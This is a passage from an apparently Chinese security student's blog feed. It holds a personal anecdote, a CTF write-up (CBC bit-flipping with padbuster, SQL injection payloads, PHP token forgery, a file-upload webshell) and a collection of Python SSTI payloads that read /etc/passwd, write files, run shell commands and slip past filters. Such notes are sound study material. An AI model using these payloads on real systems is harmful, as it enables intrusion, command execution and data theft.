src="/images/wtf/%E5%BC%80%E7%9B%92(3).jpg"><br>这妹子….什么时候说过自己是师大的?<br><img src="/images/wtf/%E5%BC%80%E7%9B%92(4).jpg"></p><p>我到这里才反应过来：这个妹子是陕师大的，在和我发征友差不多的时间里也发了个征友，先加了我小号，而我拿大号加回了她，于是造成了一场误会</p><h3 id="对方视角"><a href="#对方视角" class="headerlink" title="对方视角"></a>对方视角</h3><p>她以为我的大号是通过她发的征友加她的，于是默认我知道她是陕师大大一的,也默认我知道这是她小号</p><p>(事实上我压根没看到那个征友，而是在她加我后用大号加回了她)</p><h3 id="我的视角"><a href="#我的视角" class="headerlink" title="我的视角"></a>我的视角</h3><p>而我不知道她也发了征友，在大号加了她后就默认她是西电的(毕竟👴是在本校发的征友，她也没说自己是师大的)</p><p>也默认她知道我大号和小号是同一个人(毕竟2个号连头像都是一样的，这还用得着解释吗)<br><img src="/images/wtf/qq.jpg"></p><h3 id="第三个巧合，车祸现场"><a href="#第三个巧合，车祸现场" class="headerlink" title="第三个巧合，车祸现场"></a>第三个巧合，车祸现场</h3><p>于是在默认她是个西电学生的前提下，我手痒顺手查了一下信息，然后第三个巧合就是西电里正好有个和她叫一样名字的同学，而且他是个19级的学长，👴当时就傻眼了<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.jpg"></p><p>于是在3个巧合下，不是上帝视角的我彻底懵逼了，谁tm能想到第4种可能性啊。由于懒得在1个陌生人身上花时间，便没有选择沉住气继续问，而是直接拆身份牌。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>这样做的好处呢，就是提前真相大白了，坏处呢，自然就是好处的补集</p><p><img src="/images/wtf/%E6%8B%89%E9%BB%91.jpg"><br>成功达成了”加好友不到6小时就被女生女生拉黑”的成就。</p><h2 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h2><p>经过这件事情，本人思来想去，寝食难安，我从中获得的领悟，对我的意义，不能不说非常重大，带着这些问题，我们来审视一下，从中获得的感悟，那就是:<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E4%B8%AD%E6%8C%87.jpg"><br>去他🐎的脱单</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Th1s_summer_特殊dlc的启发_0x01</title>
    <link href="/2022/05/20/Th1s_summer_dlc_0x01/"/>
    <url>/2022/05/20/Th1s_summer_dlc_0x01/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="930a4fc27d382c01bcdd2bb8502ca98b8b46d98948b9979f541e22be0e7217ae"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">笔者自己看的 (h1nt：牢大，我想你了(╥﹏╥))</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>miniL_ctf</title>
    <link href="/2022/05/11/miniL-ctf/"/>
    <url>/2022/05/11/miniL-ctf/</url>
    
    <content type="html"><![CDATA[<p>挖个坑，等复盘，最近实验太多了</p><span id="more"></span><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="checkin-CBC字节翻转攻击-kali-padbuster"><a href="#checkin-CBC字节翻转攻击-kali-padbuster" class="headerlink" title="checkin -CBC字节翻转攻击&amp;kali-padbuster"></a>checkin -CBC字节翻转攻击&amp;kali-padbuster</h2><p>进入页面，抓包，目的是伪造token使自己身份成为vip，给出了源码，加密是AES-CBC加密<br>现学了go的gin框架，AES加密，然后没做出来…..<br>赛后复盘<br>看了看wp，可以用kali里现成的工具padbuster<br>原文来自: <a href="https://zing.gitbooks.io/kali-lunix/content/06x/6x18_PadBuster.html">kali工具使用中文说明书</a></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">:~# 破坏者</span><br><span class="hljs-section">+-----</span><br>---------------------------------------+<br>| PadBuster - v0.3.3 |<br>| Brian Holyfield - Gotham 数字科学 |<br>|<br><br><span class="hljs-section">                     |</span><br><span class="hljs-section">+--------------------------------------------+</span><br><span class="hljs-code">  使用：padBuster.pl URL EncryptedSample BlockSize [选项]</span><br>其中： URL = 目标 URL（如果适用，还有查询字符串）<br><span class="hljs-code">       EncryptedSample = 您要测试的加密值。必须</span><br><span class="hljs-code">                         也存在于 URL、PostData 或 Cookie 中</span><br><span class="hljs-code">       BlockSize = 算法使用的块大小</span><br>选项：<br><span class="hljs-code">   -auth [用户名：密码]：HTTP 基本身份验证</span><br><span class="hljs-code">   -bruteforce：对第一个块执行蛮力</span><br><span class="hljs-code">   -ciphertext [Bytes]：中间字节的密文（十六进制编码）</span><br><span class="hljs-code">       -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)</span><br><span class="hljs-code">       -encoding [0-4]：样本的编码格式（默认0）</span><br><span class="hljs-code">                        0=Base64，1=下十六进制，2=上十六进制</span><br><span class="hljs-code">                        3=.NET UrlToken，4=WebSafe Base64</span><br><span class="hljs-code">       -encodedtext [编码字符串]：要加密的数据（编码）</span><br><span class="hljs-code">       -error [错误字符串]：填充错误消息</span><br><span class="hljs-code">       -headers [HTTP 标头]：自定义标头 (name1::value1;name2::value2)</span><br><span class="hljs-code">   -interactive：提示确认解密字节</span><br><span class="hljs-code">   -intermediate [Bytes]：密文的中间字节（十六进制编码）</span><br><span class="hljs-code">   -log：生成日志文件（创建文件夹 PadBuster.DDMMYY）</span><br><span class="hljs-code">   -noencode：不对负载进行 URL 编码（默认编码）</span><br><span class="hljs-code">   -noiv：样本不包括 IV（解密第一个块）</span><br><span class="hljs-code">       -plaintext [String]：要加密的纯文本</span><br><span class="hljs-code">       -post [发布数据]：HTTP 发布数据字符串</span><br><span class="hljs-code">   -prefix [Prefix]：附加到每个样本的前缀字节（编码）</span><br><span class="hljs-code">   -proxy [地址：端口]：使用 HTTP/S 代理</span><br><span class="hljs-code">   -proxyauth [用户名：密码]：代理身份验证</span><br><span class="hljs-code">   -resume [Block Number]：在这个block number处恢复</span><br><span class="hljs-code">   -usebody：使用响应正文内容进行响应分析阶段</span><br><span class="hljs-code">       -verbose：要详细</span><br><span class="hljs-code">       -veryverbose：非常详细（仅限调试）</span><br></code></pre></td></tr></table></figure><h3 id="密码学的一点科普"><a href="#密码学的一点科普" class="headerlink" title="密码学的一点科普"></a>密码学的一点科普</h3><p><a href="https://baijiahao.baidu.com/s?id=1651159916892970446">密码学的科普</a></p><p>块加密: 就是把密文分成块，再加密(不够的补全)<br>ECB: 最早的加密，由于所有的分组的加密方式都一致，因此难以抵挡统计分析攻击，易被破解<br>CBC: 每个明文块先与前一个密文块进行异或后，再进行加密,每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV(第一明文块M1加密的时候，因为前面没有加密的密文，所以需要与一个初始化向量（IV）进行XOR（异或）)<br>OFM: 是先用块加密器生成密钥流（Keystream），然后再将密钥流与明文流异或得到密文流，解密是先用块加密器生成密钥流，再将密钥流与密文流异或得到明文，由于异或操作的对称性所以加密和解密的流程是完全一样的</p><p>填充模式:<br>ZeroPadding，数据长度不对齐时使用0填充，否则不填充。<br>PKCS7Padding，假设数据长度需要填充n(n&gt;0)个字节才对齐，那么填充n个字节，每个字节都是n;如果数据本身就已经对齐了，则填充一块长度为块大小的数据，每个字节都是块大小。<br>PKCS5Padding，PKCS7Padding的子集，块大小固定为8字节。<br>由于使用PKCS7Padding&#x2F;PKCS5Padding填充时，最后一个字节肯定为填充数据的长度，所以在解密后可以准确删除填充的数据，而使用ZeroPadding填充时，没办法区分真实数据与填充数据，所以只适合以\0结尾的字符串加解密</p><h3 id="针对CBC的字节翻转攻击"><a href="#针对CBC的字节翻转攻击" class="headerlink" title="针对CBC的字节翻转攻击"></a>针对CBC的字节翻转攻击</h3><p><a href="https://blog.csdn.net/csu_vc/article/details/79619309">链接</a><br>理解了CBC加密的过程后，想想解密怎么搞，就是翻转攻击了:<br>CBC解密的过程<br>从密文中提取出IV，然后将密文分组。<br>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>重复2-3，直到最后一组密文。</p><p>前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。也就是通过改变上一组的密文，来改变本组的明文<br>这个文章讲得不错: <a href="https://www.jianshu.com/p/1001b4c2adeb">链接</a><br>具体: 比如要改变第二个块明文的某个字节，就把第一个密文的对应字节改了，然后，再把iv改了(所以iv是可以控制的吗….因为iv是随机生成的，而且我们可见，那自然是可以改变的…)</p><h2 id="sql注入-根据sql版本特性进行注入"><a href="#sql注入-根据sql版本特性进行注入" class="headerlink" title="sql注入-根据sql版本特性进行注入"></a>sql注入-根据sql版本特性进行注入</h2><p>主要问题出在闭合上，构造的的payload不知道为什么在环境里无法回显<br>进入页面查看源码，注释里给了查询语句，可以知道表名: select * from users where username&#x3D;’$username’ and password&#x3D;’$password’; </p><p>#、– 、–+、&#x2F;**&#x2F;都过滤了，无错误回显，sleep也过滤了，但是可以堆叠注入<br>当时想到的是利用’&#39;注释引号，然后进行布尔注入，但是，在构造好了payload并检查后，发现无论如何都不回显，就很疑惑<br>于是尝试自己搭sql环境试试，我寻思搭个sql环境肯定能找到好的教程吧…然后csdn里的教程不负众望的让我搭建失败了，然后就摆烂了….<br>自己构建的不知道为毛不回显的payload: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27; || username=admin;insert into users \&#x27;</span>; <br></code></pre></td></tr></table></figure><p>wp思路:<br>注释符可以用%00代替(我当时闭合时是用insert into 闭合的，不知道为什么出错了)<br>先盲注出版本8.0.26,搜到此版本新特性table可以用来注入(怎么搜的，这也太吊了? )</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=\<br><span class="hljs-attribute">password</span>=|| (<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)&lt;(table users);%00<br>获取sql版本: 8.0<br></code></pre></td></tr></table></figure><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">username=\<br>password= ||ascii(mid(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=num;%<span class="hljs-number">00</span><br>这个mid盲注没见过<span class="hljs-params">...</span>.<br>可以爆出username和password<span class="hljs-params">...</span>..(不对啊，我记得当时ascii明明被屏蔽了来着，于是还在想怎么用别的方式进行盲注<span class="hljs-params">...</span>.)<br></code></pre></td></tr></table></figure><h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><p>token是简单的base64转码，转了是php序列化后的字符码，然后把里面的Tourist改成Lteam就行了<br>O:4”User”:1:{s:9:”usergroup”;s:7:”Tourist”;}</p><p>转了之后就是文件上传漏洞了，没有任何检查可以直接上传，然后蚁剑连就能看到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入姿势</title>
    <link href="/2022/04/26/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/04/26/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="payload作业"><a href="#payload作业" class="headerlink" title="payload作业"></a>payload作业</h1><p>有时候system函数会被过滤掉，我们就使用</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)  #读取本级目录<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">获得基类<br><span class="hljs-section">#python2.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><span class="hljs-section">#python3.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__。。。class__</span>.<span class="hljs-strong">__mro__</span>[1]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><span class="hljs-section">#python 2.7</span><br><span class="hljs-section">#文件操作</span><br><span class="hljs-section">#找到file类</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[40]<br><span class="hljs-section">#读文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()<br><span class="hljs-section">#写文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp&#x27;</span>).write(&#x27;test&#x27;)<br><br><span class="hljs-section">#命令执行</span><br><span class="hljs-section">#os执行</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.linecache下有os类，可以直接执行命令：</span><br><span class="hljs-emphasis">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func_</span>globals.linecache.os.popen(&#x27;id&#x27;).read()<br><span class="hljs-section">#eval,impoer等全局函数</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>下有eval，<span class="hljs-strong">__import__</span>等的全局函数，可以利用此来执行命令：<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__import__&#x27;</span>](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br><br><span class="hljs-section">#python3.7</span><br><span class="hljs-section">#命令执行</span><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#文件操作</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-section">#windows下的os命令</span><br>&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">118</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;dir&#x27;</span>).read()<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//获取基本类</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[1]</span><br>&#123;&#125;.__class__.__bases__<span class="hljs-selector-attr">[0]</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span><br><span class="hljs-selector-attr">[]</span>.__class__.__bases__<span class="hljs-selector-attr">[0]</span><br><span class="hljs-selector-tag">object</span><br><br><span class="hljs-comment">//读文件</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(r<span class="hljs-string">&#x27;C:\1.php&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br><span class="hljs-comment">//写文件</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<span class="hljs-selector-class">.write</span>(<span class="hljs-string">&#x27;123&#x27;</span>)<br><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<span class="hljs-selector-class">.write</span>(<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><span class="hljs-comment">//执行任意命令</span><br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[13]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br><span class="hljs-selector-tag">object</span>.__subclasses_ <span class="hljs-built_in">_</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[13]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<br></code></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>拼接: </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">object</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[59]</span>.__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;linecache&#x27;</span>]</span>.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>]</span>.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>]</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>().__class__.__bases__<span class="hljs-selector-attr">[0]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;fla&#x27;</span>+<span class="hljs-string">&#x27;g.txt&#x27;</span>))<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>编码:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;ls&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)<br><br>等价于<br><br>()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;ZXZhbA==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)]</span>(&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode(&#x27;base64&#x27;))(可以看出单双引号内的都可以编码)<br><br>同理还可以进行rot13、<span class="hljs-number">16</span>进制编码等<br></code></pre></td></tr></table></figure><p>过滤中括号: </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getitem</span><span class="hljs-params">()</span></span><br><br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span><br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>)<br><br><span class="hljs-function"><span class="hljs-title">pop</span><span class="hljs-params">()</span></span><br><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br>字典读取<br><br>__builtins__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>()<br>__builtins__<span class="hljs-selector-class">.eval</span>()<br><br>经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行<br><br></code></pre></td></tr></table></figure><p>过滤引号: </p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span 